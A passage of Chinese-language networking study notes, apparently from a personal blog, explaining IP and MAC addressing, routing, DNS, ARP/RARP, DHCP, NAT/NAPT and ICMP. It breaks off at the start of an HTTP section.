地址</strong>会指引数据在当前网络区间内的传输，确保数据从一个节点传递到另一个节点，直至抵达目标网络。</li></ul><p>举例</p><p>小林的出行示例可以进一步理解这个过程：</p><p>举个生活的栗子，小林要去一个很远的地方旅行，制定了一个行程表，其间需先后乘 坐飞机、地铁、公交车才能抵达目的地，为此小林需要买飞机票，地铁票等。 飞机票和地铁票都是去往特定的地点的，每张票只能够在某一限定区间内移动，此处 的「区间内」就如同通信网络中数据链路。 在区间内移动相当于数据链路层，充当区间内两个节点传输的功能，区间内的出发点 好比源 MAC 地址，目标地点好比目的 MAC 地址。 整个旅游行程表就相当于网络层，充当远程定位的功能，行程的开始好比源 IP，行 程的终点好比目的 IP 地址。如果小林只有行程表而没有车票，就无法搭乘交通工具到达目的地。相反，如果除了 车票而没有行程表，恐怕也很难到达目的地。因为小林不知道该坐什么车，也不知道 该在哪里换乘。 因此，只有两者兼备，既有某个区间的车票又有整个旅行的行程表，才能保证到达目 的地。与此类似，计算机网络中也需要「数据链路层」和「网络层」这个分层才能实 现向最终目标地址的通信。 还有重要一点，旅行途中我们虽然不断变化了交通工具，但是旅行行程的起始地址和 目的地址始终都没变。其实，在网络中数据包传输中也是如此，源IP地址和目标IP地 址在传输过程中是不会变化的，只有源 MAC 地址和目标 MAC 一直在变化</p><ul><li><p><strong>行程表（IP 地址）</strong>：小林知道出发点和终点在哪里，需要经过哪些城市或地点。这是网络层 IP 的作用——确保数据最终能跨越多个网络区间，到达目的网络。</p></li><li><p><strong>车票（MAC 地址）</strong>：小林在每个特定的区间（如机场、地铁站、公交站）买票，从一个交通节点移动到下一个节点。这就是数据链路层 MAC 的作用——在局部的网络环境中，从一个设备传到另一个设备，逐步推进数据到目标。</p><p>总结</p><p>IP 地址是“全局路线图”，用于确定远距离的网络传输方向。MAC 地址是“局部导航”，负责在同一局域网内的数据传输。两者缺一不可，只有 IP 地址和 MAC 地址共同协作，才能让数据成功地从源头传递到目的地。</p></li></ul><p>IP地址的基础知识  IP地址的定义  在 TCP&#x2F;IP 网络通信时，为了保证能正常通信，每个设备都需要配置正确的 IP 地址， 否则无法实现正常的通信。 IP 地址（IPv4 地址）由  32 位正整数来表示，IP 地址在计算机是以二进制的方式处 理的。 而人类为了方便记忆采用了点分十进制的标记方式，也就是将 32 位 IP 地址以每 8  位为组，共分为 4 组，每组以「.」隔开，再将每组转换成十进制</p><p>![image-20241114203640359](F:\new myblog\STUDY\source\img\image-20241114203640359.png)</p><p>![image-20241114203659730](F:\new myblog\STUDY\source\img\image-20241114203659730.png)</p><p>在 IP 地址中，有两个 IP 是特殊的，分别是主机号全为 1 和 全为 0 地址</p><p>主机号全为 1 指定某个网络下的所有主机，用于广播 主机号全为 0 指定某个网络。广播地址用于在同一个链路中相互连接的主机之间发送数据包</p><p>![image-20241114203803343](F:\new myblog\STUDY\source\img\image-20241114203803343.png)</p><p>学校班级中就有广播的例子，在准备上课的时候，通常班长会喊：“上课， 全体起 立！”，班里的同学听到这句话是不是全部都站起来了？这个句话就有广播的含义。 当主机号全为 1 时，就表示该网络的广播地址。例如把  172.20.0.0&#x2F;16 用二进制表 示如下： 10101100.00010100.00000000.00000000 将这个地址的主机部分全部改为 1，则形成广播地址： 10101100.00010100.11111111.11111111 再将这个地址用十进制表示，则为  172.20.255.255。 广播地址可以分为本地广播和直接广播两种。</p><p>在本网络内广播的叫做本地广播。例如网络地址为 192.168.0.0&#x2F;24 的情况下， 广播地址是 192.168.0.255 。因为这个广播地址的 IP 包会被路由器屏蔽，所以 不会到达 192.168.0.0&#x2F;24 以外的其他链路上。 </p><p>在不同网络之间的广播叫做直接广播。例如网络地址为 192.168.0.0&#x2F;24 的主机 向 192.168.1.255&#x2F;24 的目标地址发送 IP 包。收到这个包的路由器，将数据转发 给192.168.1.0&#x2F;24，从而使得所有 192.168.1.1~192.168.1.254 的主机都能收到 这个包（由于直接广播有一定的安全问题，多数情况下会在路由器上设置为不转 发）</p><p>![image-20241114203856867](F:\new myblog\STUDY\source\img\image-20241114203856867.png)</p><p> D 类和 E 类地址是没有主机号的，所以不可用于主机 IP，D 类常被用于多播，E  类是预留的分类，暂时未使用，不管是路由器还是主机解析到一个 IP 地址时候，我们判断其 IP 地址的首位是否为  0，为 0 则为 A 类地址，那么就能很快的找出网络地址和主机地址。 其余分类判断方式参考如下图</p><p>![image-20241114204000116](F:\new myblog\STUDY\source\img\image-20241114204000116.png)</p><p>公有IP与私有IP地址  在 A、B、C 分类地址，实际上有分公有 IP 地址和 私有 IP 地址</p><p>![image-20241114204019915](F:\new myblog\STUDY\source\img\image-20241114204019915.png)</p><p>平时我们办公室、家里、学校用的 IP 地址，一般都是私有 IP 地址。因为这些地址允 许组织内部的 IT 人员自己管理、自己分配，而且可以重复。因此，你学校的某个私 有 IP 地址和我学校的可以是一样的。</p><p> 就像每个小区都有自己的楼编号和门牌号，你小区家可以叫  1 栋 101 号，我小区家 也可以叫 1 栋 101，没有任何问题。但一旦出了小区，就需要带上中山路 666 号 （公网 IP 地址），是国家统一分配的，不能两个小区都叫中山路 666。 </p><p>所以，公有 IP 地址是有个组织统一分配的，假设你要开一个博客网站，那么你就需 要去申请购买一个公有 IP，这样全世界的人才能访问。并且公有 IP 地址基本上要在 整个互联网范围内保持唯一</p><h4 id="IP-地址与路由控制"><a href="#IP-地址与路由控制" class="headerlink" title="IP 地址与路由控制"></a>IP 地址与路由控制</h4><p> IP地址的网络地址这一部分是用于进行路由控制。 路由控制表中记录着网络地址与下一步应该发送至路由器的地址，在主机和路由器上 都会有各自的路由器控制表。 在发送 IP 包时，首先要确定 IP 包首部中的目标地址，再从路由控制表中找到与该地 址具有相同网络地址的记录，根据该记录将 IP 包转发给相应的下一个路由器。如果 路由控制表中存在多条相同网络地址的记录，就选择相同位数最多的网络地址，也就是最长匹配</p><p>![image-20241114204120253](F:\new myblog\STUDY\source\img\image-20241114204120253.png)</p><p>传输过程详解</p><ol><li><strong>主机 A 发起 IP 包的传输</strong><ul><li><strong>源 IP 地址</strong>：10.1.1.30（主机 A 的 IP 地址）</li><li><strong>目标 IP 地址</strong>：10.1.2.10（目标主机的 IP 地址）</li><li>当主机 A 要将 IP 包发送给目标地址 10.1.2.10 时，它首先会查找自己的<strong>路由表</strong>，查看是否有通往 10.1.2.10 的直接路径。</li><li><strong>查找路由表</strong>：由于主机 A 的路由表中没有匹配的条目，它将此包转发给<strong>默认网关</strong>，即 <strong>路由器 1</strong>。</li></ul></li><li><strong>路由器 1 收到 IP 包</strong><ul><li>路由器 1 接收到了主机 A 发来的 IP 包，开始查找自己的<strong>路由表</strong>，试图找到通向目标 IP 地址（10.1.2.10）的路由。</li><li><strong>匹配路由表</strong>：在路由表中，路由器 1 找到了一个匹配的条目，它知道可以通过将包发送给 <strong>路由器 2</strong>（IP 地址为 10.1.0.2）来达到目标网络。</li><li><strong>转发 IP 包</strong>：于是，路由器 1 将 IP 包转发给了 <strong>路由器 2</strong>。</li></ul></li><li><strong>路由器 2 收到 IP 包</strong><ul><li>路由器 2 接收到了从路由器 1 转发过来的 IP 包，同样会在自己的<strong>路由表</strong>中查找是否有通往目标地址 10.1.2.10 的路径。</li><li><strong>查找路由表</strong>：路由器 2 的路由表中发现了目标网络（10.1.2.0&#x2F;24），并确定可以通过其接口 10.1.2.1 到达该网络。</li><li><strong>转发 IP 包</strong>：于是，路由器 2 将 IP 包通过其 10.1.2.1 接口转发出去。</li></ul></li><li><strong>经过交换机到达目标主机</strong><ul><li>当 IP 包从路由器 2 的 10.1.2.1 接口发出后，进入到交换机。</li><li>交换机会根据<strong>目标 MAC 地址</strong>，将 IP 包传递给在同一局域网中的目标主机 10.1.2.10。</li><li><strong>最终目的地</strong>：目标主机 10.1.2.10 收到了来自主机 A（10.1.1.30）的 IP 包。</li></ul></li></ol><p><strong>路由器的作用</strong>：在网络中，不同网络之间的通信由路由器负责，路由器通过<strong>路由表</strong>来确定数据包的转发路径。</p><p><strong>路由查找</strong>：每个路由器收到 IP 包后都会查找自己的路由表，找到通往目标地址的最佳路径，然后逐跳转发，直到包抵达目标网络。</p><p><strong>逐跳转发</strong>：IP 包会经过多个路由器，每个路由器都会更新包的 MAC 地址（源 MAC 和目标 MAC），但<strong>源 IP 和目标 IP 始终不变</strong>。</p><p><strong>局域网内的传输</strong>：当 IP 包到达目标网络后，通常会通过交换机等局域网设备最终传递到目标主机。</p><p>环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。 计算机使用一个特殊的 IP 地址 127.0.0.1 作为环回地址，与该地址具有相同意义的 是一个叫做 localhost 的主机名。 使用这个 IP 或主机名时，数据包不会流向网络</p><h2 id="IP-协议相关技术"><a href="#IP-协议相关技术" class="headerlink" title="IP 协议相关技术"></a>IP 协议相关技术</h2><h3 id="1-DNS（域名系统）"><a href="#1-DNS（域名系统）" class="headerlink" title="1. DNS（域名系统）"></a>1. <strong>DNS（域名系统）</strong></h3><ul><li><strong>作用</strong>：将人类易读的域名（如 <a href="http://www.example.com)转换为/">www.example.com）转换为</a> IP 地址（如 192.168.1.1），因为人们更容易记住域名。</li><li><strong>域名层级</strong>：域名具有层级关系，从右到左依次为：根域、顶级域、次级域。</li><li>层级关系示例<ul><li><strong>根 DNS 服务器</strong>：位于层级的最顶层，负责管理顶级域的请求。</li><li><strong>顶级域 DNS 服务器</strong>：如 .com、.net、.org，管理该顶级域下的所有子域。</li><li><strong>权威 DNS 服务器</strong>：如 example.com 的 DNS 服务器，负责提供该域下具体主机的 IP 地址。</li></ul></li><li><strong>解析过程</strong>：当你访问 <a href="http://www.example.com/">www.example.com</a> 时，DNS 系统会逐层解析，最终找到该域名的 IP 地址，完成域名到 IP 地址的转换。</li></ul><hr><h3 id="2-ARP（地址解析协议）和-RARP（逆地址解析协议）"><a href="#2-ARP（地址解析协议）和-RARP（逆地址解析协议）" class="headerlink" title="2. ARP（地址解析协议）和 RARP（逆地址解析协议）"></a>2. <strong>ARP（地址解析协议）和 RARP（逆地址解析协议）</strong></h3><ul><li><p>ARP（Address Resolution Protocol）</p><p>用于将 IP 地址解析为 MAC 地址，确保在局域网内能够找到对应设备。</p><ul><li>工作过程：主机 A 想通过 IP 地址与局域网中的主机 B 通信，但需要知道主机 B 的 MAC 地址。ARP 广播请求后，主机 B 响应自己的 MAC 地址，主机 A 可以直接与主机 B 通信。</li></ul></li><li><p><strong>RARP（Reverse ARP）</strong>：与 ARP 相反，RARP 是通过 MAC 地址来获取 IP 地址的协议，用于一些设备在启动时通过 MAC 地址获得 IP 地址（现在较少使用，DHCP 通常可以替代）。</p></li></ul><hr><h3 id="3-DHCP（动态主机配置协议）"><a href="#3-DHCP（动态主机配置协议）" class="headerlink" title="3. DHCP（动态主机配置协议）"></a>3. <strong>DHCP（动态主机配置协议）</strong></h3><ul><li><strong>作用</strong>：动态为设备分配 IP 地址、子网掩码、网关、DNS 服务器等网络参数，减少手动配置的麻烦。</li><li>工作流程<ol><li><strong>请求</strong>：设备连接到网络时，发送 DHCP 请求。</li><li><strong>提供</strong>：DHCP 服务器收到请求，分配一个未使用的 IP 地址，并将相关网络参数发送给设备。</li><li><strong>确认</strong>：设备接受并确认使用该 IP 地址。</li></ol></li><li><strong>优点</strong>：自动分配 IP 地址，避免了手动配置的错误，适用于动态变化的网络环境。</li></ul><hr><h3 id="4-NAT（网络地址转换）"><a href="#4-NAT（网络地址转换）" class="headerlink" title="4. NAT（网络地址转换）"></a>4. <strong>NAT（网络地址转换）</strong></h3><ul><li><strong>作用</strong>：用于将私有 IP 地址转换为公有 IP 地址，通常用于内部网络访问外部网络（如互联网）。</li><li>类型<ul><li><strong>静态 NAT</strong>：将私有 IP 和公有 IP 一一映射。</li><li><strong>动态 NAT</strong>：根据需要动态分配公有 IP 地址。</li><li><strong>PAT（端口地址转换）</strong>：将多个私有 IP 地址映射到同一个公有 IP 地址，但使用不同的端口区分。</li></ul></li><li><strong>优点</strong>：通过 NAT，可以节省公有 IP 地址，增强内部网络的安全性，因为外部网络无法直接访问私有 IP 地址。</li></ul><hr><h3 id="5-ICMP（互联网控制报文协议）"><a href="#5-ICMP（互联网控制报文协议）" class="headerlink" title="5. ICMP（互联网控制报文协议）"></a>5. <strong>ICMP（互联网控制报文协议）</strong></h3><ul><li><p><strong>作用</strong>：用于发送控制消息，检测网络连接状况，通常用于诊断和故障排除。</p></li><li><p>常见用途</p><ul><li><strong>Ping</strong>：测试目标主机是否可达，返回响应时间。</li><li><strong>Traceroute</strong>：显示数据包从源到目标经过的每一跳的网络设备，帮助分析网络延迟和中断位置。</li></ul></li><li><p><strong>功能</strong>：ICMP 不用于传输数据，而是提供网络故障信息、连接测试、路径追踪等工具。</p></li><li><p><strong>DNS</strong> 解决了域名到 IP 的转换。</p><p><strong>ARP&#x2F;RARP</strong> 实现了 IP 地址与 MAC 地址的对应。</p><p><strong>DHCP</strong> 动态分配 IP 地址，简化网络配置。</p><p><strong>NAT</strong> 进行地址转换，优化 IP 地址的使用。</p><p><strong>ICMP</strong> 则用于网络诊断和控制，确保网络运行正常。</p></li></ul><h3 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS 域名解析"></a>DNS 域名解析</h3><p>![image-20241114204250218](F:\new myblog\STUDY\source\img\image-20241114204250218.png)</p><p>DNS 域名解析流程</p><ol><li><strong>缓存检查</strong>：<ul><li>浏览器会先查找自己的缓存，看看是否已有对应域名的 IP 地址。</li><li>如果浏览器没有找到，则向操作系统的缓存查询。</li><li>若操作系统的缓存中也没有，再查找本地的 <strong>hosts 文件</strong>。如果 <strong>hosts 文件</strong>中也没有对应的 IP 地址，则进行 DNS 查询。</li></ul></li><li><strong>向本地 DNS 服务器发起请求</strong>：<ul><li>客户端向<strong>本地 DNS 服务器</strong>（通常是网络提供商的 DNS 服务器）发出请求，询问目标域名（如 <a href="http://www.server.com)的/">www.server.com）的</a> IP 地址。</li></ul></li><li><strong>本地 DNS 查询缓存</strong>：<ul><li>本地 DNS 服务器会先查询自己的缓存。如果缓存中已有该域名的 IP 地址，则直接返回结果。</li><li>如果缓存中没有找到，则本地 DNS 会向<strong>根域名服务器</strong>发出请求。</li></ul></li><li><strong>根 DNS 指向顶级域 DNS</strong>：<ul><li>根 DNS 服务器收到请求后，发现查询的是 <code>.com</code> 结尾的域名。于是，它告诉本地 DNS 去找负责 <code>.com</code> 域名的<strong>顶级域名服务器</strong>，并提供其地址。</li></ul></li><li><strong>顶级域 DNS 指向权威 DNS</strong>：<ul><li>本地 DNS 服务器接到 <code>.com</code> 顶级域的地址后，向该<strong>顶级域名服务器</strong>询问 <code>server.com</code> 的 IP 地址。</li><li>顶级域名服务器告诉本地 DNS 去找 <code>server.com</code> 的<strong>权威 DNS 服务器</strong>，并提供其地址。</li></ul></li><li><strong>权威 DNS 返回 IP 地址</strong>：<ul><li>本地 DNS 服务器联系 <code>server.com</code> 的<strong>权威 DNS 服务器</strong>，询问 <code>www.server.com</code> 的 IP 地址。</li><li>权威 DNS 服务器查询其数据库，找到 <code>www.server.com</code> 对应的 IP 地址（如 X.X.X.X），并将结果返回给本地 DNS。</li></ul></li><li><strong>返回 IP 给客户端</strong>：<ul><li>本地 DNS 服务器将 <code>www.server.com</code> 的 IP 地址返回给客户端。</li><li>客户端获得 IP 地址后，便可以直接与目标服务器建立连接，访问 <code>www.server.com</code>。</li></ul></li></ol><p>![image-20241114204317144](F:\new myblog\STUDY\source\img\image-20241114204317144.png)</p><h3 id="ARP-协议工作流程"><a href="#ARP-协议工作流程" class="headerlink" title="ARP 协议工作流程"></a>ARP 协议工作流程</h3><p>ARP 是借助 ARP 请求与 ARP 响应两种类型的包确定 MAC 地址的</p><ol><li><strong>准备 IP 数据包</strong>：<ul><li>在传输一个 IP 数据包时，主机已经确定了源 IP 地址和目标 IP 地址。</li><li>根据主机的路由表，主机可以找到 IP 包的<strong>下一跳</strong>，即数据包需要发送的下一个设备的 IP 地址（可能是目标设备，也可能是中间的路由器）。</li></ul></li><li><strong>获取 MAC 地址的需求</strong>：<ul><li>网络层负责将数据包传递到目标 IP 地址或下一跳 IP 地址。</li><li>但是，网络层的下一层是数据链路层，数据链路层需要通过 MAC 地址进行通信。因此，主机需要知道<strong>下一跳设备的 MAC 地址</strong>。</li></ul></li><li><strong>ARP 请求</strong>：<ul><li>如果主机还不知道下一跳的 MAC 地址，它会发出一个<strong>ARP 请求</strong>。</li><li>ARP 请求是一种<strong>广播包</strong>，包含请求方的 IP 地址、MAC 地址，以及目标 IP 地址（需要查询的 IP 地址）。</li><li>由于是广播包，网络内的所有设备都能收到这个请求包。</li></ul></li><li><strong>ARP 响应</strong>：<ul><li>在网络中，每台设备收到 ARP 请求后，会检查请求中的目标 IP 地址是否与自身的 IP 地址匹配。</li><li>如果匹配，目标设备会<strong>回复一个 ARP 响应</strong>，在响应包中包含自己的 MAC 地址。</li><li>ARP 响应是<strong>单播包</strong>，只发回给请求方。</li></ul></li><li><strong>更新 ARP 缓存</strong>：<ul><li>请求方（发送 ARP 请求的主机）收到 ARP 响应后，会把目标 IP 地址和对应的 MAC 地址记录到<strong>ARP 缓存</strong>中。</li><li>下次再需要发送给同一 IP 地址的数据包时，主机可以直接从缓存中获取 MAC 地址，而不需要再次发送 ARP 请求。</li></ul></li><li><strong>完成数据传输</strong>：<ul><li>通过 ARP 获取到目标 MAC 地址后，主机可以在数据包的链路层帧头中添加正确的 MAC 地址。</li><li>然后，数据包就可以发送到目标设备，完成这一跳的传输。</li></ul></li></ol><p>![image-20241114204327513](F:\new myblog\STUDY\source\img\image-20241114204327513.png)</p><p>主机会通过广播发送 ARP 请求，这个包中包含了想要知道的 MAC 地址的主机 IP 地址。</p><p>当同个链路中的所有设备收到 ARP 请求时，会去拆开 ARP 请求包里的内容，如果 ARP 请求包中的目标 IP 地址与自己的 IP 地址一致，那么这个设备就将自己的 MAC 地址塞入 ARP 响应包返回给主机。</p><p>操作系统通常会把第一次通过 ARP 获取的 MAC 地址缓存起来，以便下次直接从缓存中找到对应 IP 地址的 MAC 地址。</p><p>不过，MAC 地址的缓存是有一定期限的，超过这个期限，缓存的内容将被清除。</p><p>ARP 协议是已知 IP 地址求 MAC 地址，那 RARP 协议正好相反。它是已知 MAC 地址求 IP 地址。例如将打印机服务器等小型嵌入式设备接入到网络时就经常会用得到。</p><p>通常这需要架设一台 RARP 服务器，在这个服务器上注册设备的 MAC 地址及其 IP 地址。然后再将这个设备接入到网络，接着：</p><p>该设备会发送一条「我的 MAC 地址是 XXXX，请告诉我，我的 IP 地址应该是什么」的请求信息。</p><p>RARP 服务器接到这个消息后返回「MAC 地址为 XXXX 的设备，IP 地址为 XXXX」的信息给这个设备。</p><p>最后，设备就根据从 RARP 服务器所收到的应答信息设置自己的 IP 地址。</p><p>![image-20241114204342956](F:\new myblog\STUDY\source\img\image-20241114204342956.png)</p><h3 id="DHCP-动态获取-IP-地址"><a href="#DHCP-动态获取-IP-地址" class="headerlink" title="DHCP 动态获取 IP 地址"></a>DHCP 动态获取 IP 地址</h3><p>DHCP 在生活中非常常见。我们的电脑通常通过 DHCP 动态获取 IP 地址，这大大简化了手动配置 IP 信息的过程。</p><p>![image-20241114204358756](F:\new myblog\STUDY\source\img\image-20241114204358756.png)</p><p>DHCP 交互的 4 个步骤</p><ol><li><strong>DHCP Discover（发现报文）</strong><ul><li>客户端首先发起 DHCP 发现报文（DHCP DISCOVER），这是一个 IP 数据报。</li><li>由于客户端没有 IP 地址，也不知道 DHCP 服务器的地址，因此使用 <strong>UDP 广播通信</strong>。</li><li>发现报文的<strong>目的地址</strong>是广播地址 <code>255.255.255.255</code>（端口 67），而<strong>源 IP 地址</strong>是 <code>0.0.0.0</code>（端口 68）。</li><li>客户端将该数据报传递给链路层，链路层再将其广播到所有网络设备。</li></ul></li><li><strong>DHCP Offer（提供报文）</strong><ul><li>DHCP 服务器收到发现报文后，会用 DHCP 提供报文（DHCP OFFER）向客户端响应。</li><li>提供报文依然使用广播地址 <code>255.255.255.255</code>。</li><li>报文中包含了服务器提供的可租用 IP 地址、子网掩码、默认网关、DNS 服务器以及 IP 地址的租用期等配置信息。</li></ul></li><li><strong>DHCP Request（请求报文）</strong><ul><li>客户端收到一个或多个服务器的 DHCP 提供报文后，从中选择一个服务器，并向选定的服务器发送 DHCP 请求报文（DHCP REQUEST）。</li><li>该请求报文回显了服务器提供的参数。</li></ul></li><li><strong>DHCP ACK（确认报文）</strong><ul><li>服务器收到 DHCP 请求报文后，使用 DHCP ACK 报文进行响应，确认所请求的参数。</li><li>一旦客户端收到 DHCP ACK 报文，整个交互过程便完成，客户端即可在租用期内使用服务器分配的 IP 地址。</li></ul></li></ol><p>租约续约过程</p><ul><li><p>租期快到期时</p><p>客户端会向服务器发送 DHCP 请求报文。</p><ul><li>如果服务器同意续约，会用 DHCP ACK 报文应答，客户端即可延长租期。</li><li>如果服务器不同意续约，则会用 DHCP NACK 报文应答，客户端必须停止使用当前 IP 地址。</li></ul></li></ul><p>由于 DHCP 交互全程使用<strong>UDP 广播</strong>通信，如果 DHCP 服务器和客户端不在同一个局域网内，而路由器不会转发广播包，那么每个网络都需要一个 DHCP 服务器。</p><p>为了解决这个问题，出现了<strong>DHCP 中继代理</strong>。有了 DHCP 中继代理，不同网段的 IP 地址分配也可以由一个 DHCP 服务器统一管理，简化了网络管理。</p><p>![image-20241114204414199](F:\new myblog\STUDY\source\img\image-20241114204414199.png)</p><p>DHCP 中继代理的工作流程</p><ol><li><strong>DHCP 客户端向中继代理发送请求</strong><ul><li>DHCP 客户端会将 DHCP 请求包发送给<strong>DHCP 中继代理</strong>。</li><li>DHCP 中继代理收到客户端的广播请求包后，将其转发给 DHCP 服务器，但这次是以<strong>单播</strong>的形式发出。</li></ul></li><li><strong>DHCP 服务器响应中继代理</strong><ul><li>DHCP 服务器收到中继代理转发的请求包后，返回一个应答包给中继代理。</li><li>这个应答包包含了分配给客户端的 IP 地址和其他网络配置信息。</li></ul></li><li><strong>中继代理转发应答给客户端</strong><ul><li>DHCP 中继代理收到服务器的应答包后，再将该包转发给 DHCP 客户端。</li></ul></li></ol><h3 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT 网络地址转换"></a>NAT 网络地址转换</h3><p>Pv4 地址资源非常紧缺，尽管通过无分类地址（CIDR）可以减缓 IPv4 地址的耗尽速度，但随着互联网用户的快速增长，IPv4 地址依然面临耗尽的风险。</p><p>于是，提出了一种<strong>网络地址转换（NAT）</strong>的方法，再次缓解了 IPv4 地址耗尽的问题。</p><p>简单来说，<strong>NAT</strong> 是在同一公司、家庭或教室内的主机对外通信时，将<strong>私有 IP 地址</strong>转换成<strong>公有 IP 地址</strong>。这种转换使得多个内网设备可以共享一个公有 IP 地址，从而减少公有 IP 的需求。</p><p>然而，普通的 NAT 转换虽然可以节省 IP 地址，但在大量设备访问互联网的情况下依然不够用。</p><p>![image-20241114204426532](F:\new myblog\STUDY\source\img\image-20241114204426532.png)</p><p>![image-20241114204439369](F:\new myblog\STUDY\source\img\image-20241114204439369.png)</p><h3 id="NAPT-路由器的转换"><a href="#NAPT-路由器的转换" class="headerlink" title="NAPT 路由器的转换"></a>NAPT 路由器的转换</h3><p>在网络地址和端口转换（NAPT）中，多个私有 IP 地址的客户端可以通过同一个公有 IP 地址访问同一台服务器，NAPT 使用<strong>端口号</strong>来区分每个连接。</p><p>示例场景</p><ul><li>两个客户端：<strong>192.168.1.10</strong> 和 <strong>192.168.1.11</strong>，它们都在与服务器 <strong>183.232.231.172</strong> 进行通信。</li><li>本地端口：这两个客户端的本地端口号都是 <strong>1025</strong>。</li><li>公有 IP 地址：NAPT 路由器为两个客户端提供一个<strong>相同的公有 IP 地址</strong>，如 <strong>120.229.175.121</strong>，并通过不同的端口号来区分连接。</li></ul><p>NAPT 转换表</p><p>NAPT 路由器会为每个连接生成一个转换表，用于正确地转换 IP 地址和端口号的组合，以确保不同的客户端能够同时与服务器进行通信。<br>转换表的示例如下：</p><table><thead><tr><th>内部 IP 地址</th><th>内部端口</th><th>公有 IP 地址</th><th>公有端口</th></tr></thead><tbody><tr><td>192.168.1.10</td><td>1025</td><td>120.229.175.121</td><td>30001</td></tr><tr><td>192.168.1.11</td><td>1025</td><td>120.229.175.121</td><td>30002</td></tr></tbody></table><ul><li><strong>客户端 A</strong>（192.168.1.10:1025）会被转换为 <strong>120.229.175.121:30001</strong>。</li><li><strong>客户端 B</strong>（192.168.1.11:1025）会被转换为 <strong>120.229.175.121:30002</strong>。</li></ul><p>转换表的生成与删除</p><ul><li>NAPT 转换表在<strong>建立连接时生成</strong>，例如在 TCP 连接首次握手时，SYN 包发出后就会生成表项。</li><li>在连接关闭时（例如 TCP 的 FIN 包确认应答），对应的转换表项会被删除，从而释放资源。</li></ul><p>ICMP 互联网控制报文协议</p><p>在复杂的网络传输环境中，网络包传输常常遇到各种问题。当问题发生时，计算机网络需要“告知”发送方，以便及时调整传输策略，从而<strong>控制整个网络的稳定性和可靠性</strong></p><p><strong>ICMP（互联网控制报文协议）</strong>主要用于报告网络传输中的问题并提供诊断信息，具体功能包括：</p><ul><li><strong>确认 IP 包是否成功送达目标地址</strong></li><li><strong>报告 IP 包在传输过程中被丢弃的原因</strong></li><li><strong>帮助优化和改善网络设置</strong></li></ul><p>![image-20241114204450318](F:\new myblog\STUDY\source\img\image-20241114204450318.png)</p><p>在 IP 通信中，如果某个 IP 包未能成功到达目标地址，ICMP 负责通知发送方并提供具体的失败原因。例如：</p><ol><li><strong>通知过程</strong>：<ul><li>主机 A 向主机 B 发送数据包，但由于某种原因，途中的<strong>路由器 2</strong>未能找到主机 B。</li><li>路由器 2 会向主机 A 发送一个 <strong>ICMP 目标不可达</strong>消息，告知主机 A 目标主机 B 无法到达。</li></ul></li><li><strong>消息传递</strong>：<ul><li>ICMP 消息通过 IP 协议发送，按照正常的路由转发过程返回给发送方。</li><li>路由器 2 发送的 ICMP 消息会先经过<strong>路由器 1</strong>，再转发给主机 A。</li></ul></li><li><strong>解析 ICMP 消息</strong>：<ul><li>主机 A 接收到 ICMP 消息后，解析消息的首部和数据域，得知具体的问题原因。</li></ul></li></ol><p>您提到的 ICMP 的 “控制” 功能非常关键，以下是相关内容的整理版本：</p><hr><h3 id="ICMP：网络控制和诊断协议"><a href="#ICMP：网络控制和诊断协议" class="headerlink" title="ICMP：网络控制和诊断协议"></a>ICMP：网络控制和诊断协议</h3><p>在复杂的网络传输环境中，网络包传输常常遇到各种问题。当问题发生时，计算机网络需要“告知”发送方，以便及时调整传输策略，从而<strong>控制整个网络的稳定性和可靠性</strong>。</p><hr><p>ICMP 的主要功能</p><p><strong>ICMP（互联网控制报文协议）</strong>主要用于报告网络传输中的问题并提供诊断信息，具体功能包括：</p><ul><li><strong>确认 IP 包是否成功送达目标地址</strong></li><li><strong>报告 IP 包在传输过程中被丢弃的原因</strong></li><li><strong>帮助优化和改善网络设置</strong></li></ul><hr><p>ICMP 报告问题的过程</p><p>在 IP 通信中，如果某个 IP 包未能成功到达目标地址，ICMP 负责通知发送方并提供具体的失败原因。例如：</p><ol><li><p><strong>通知过程</strong>：</p><ul><li>主机 A 向主机 B 发送数据包，但由于某种原因，途中的<strong>路由器 2</strong>未能找到主机 B。</li><li>路由器 2 会向主机 A 发送一个 <strong>ICMP 目标不可达</strong>消息，告知主机 A 目标主机 B 无法到达。</li></ul></li><li><p><strong>消息传递</strong>：</p><ul><li>ICMP 消息通过 IP 协议发送，按照正常的路由转发过程返回给发送方。</li><li>路由器 2 发送的 ICMP 消息会先经过<strong>路由器 1</strong>，再转发给主机 A。</li></ul></li><li><p><strong>解析 ICMP 消息</strong>：</p><ul><li>主机 A 接收到 ICMP 消息后，解析消息的首部和数据域，得知具体的问题原因。</li></ul></li></ol><hr><p>ICMP 消息的分类</p><p>ICMP 消息分为两大类：</p><ol><li><p><strong>查询报文类型</strong>：用于诊断网络的健康状况，例如 <code>ping</code> 和 <code>traceroute</code> 工具的基础。</p><ul><li>例如 <code>ping</code> 命令就是发送 ICMP 回显请求报文，确认目标主机是否可达，并测量往返时间。</li></ul></li><li><p><strong>差错报文类型</strong>：用于报告传输错误原因，帮助发送方了解网络中的问题。</p><ul><li>例如，当路由器无法找到目标 IP 时，会返回“目标不可达”报文，指明数据包未送达的原因。</li></ul></li></ol><p>![image-20241114204501213](F:\new myblog\STUDY\source\img\image-20241114204501213.png)</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>HTTP的名字「超文本协议传输」，它可以拆成三个部分： 超文本 传输 协议</p><ol><li><p>协议     HTTP 是一个用在计算机世界里的协议。它使用计算机能够理解的语言确立了一种计 算机之间交流通信的规范（两个以上的参与者），以及相关的各种控制和错误处理方 式（行为约定和规范）。</p></li><li><p>传输   就是把一堆东西从 A 点搬到 B 点，或者从 B 点 搬到 A 点。 HTTP 协议是一个双向协议。 HTTP 是一个在计算机世界里专门用来在两点之间传输数据的约定和规范。 我们在上网冲浪时，浏览器是请求方 A ，百度网站就是应答方 B。双方约定用 HTTP  协议来通信，于是浏览器把请求数据发送给网站，网站再把一些数据返回给浏览器， 最后由浏览器渲染在屏幕，就可以看到图片、视频了</p></li><li><p>超文本     HTTP 传输的内容是「超文本」 「文本」，在互联网早期的时候只是简单的字符文字，但现在「文本」。的涵义已经 可以扩展为图片、视频、压缩包等，在 HTTP 眼里这些都算做「文本」。「超文本」，它就是超越了普通文本的文本，它是文字、图片、视频等的混合体，最 关键有超链接，能从一个超文本跳转到另外一个超文本。 HTML 就是最常见的超文本了，它本身只是纯文字文件，但内部用很多标签定义了图 片、视频等的链接，在经过浏览器的解释，呈现给我们的就是一个文字、有画面的网页了</p></li></ol><p>   HTTP 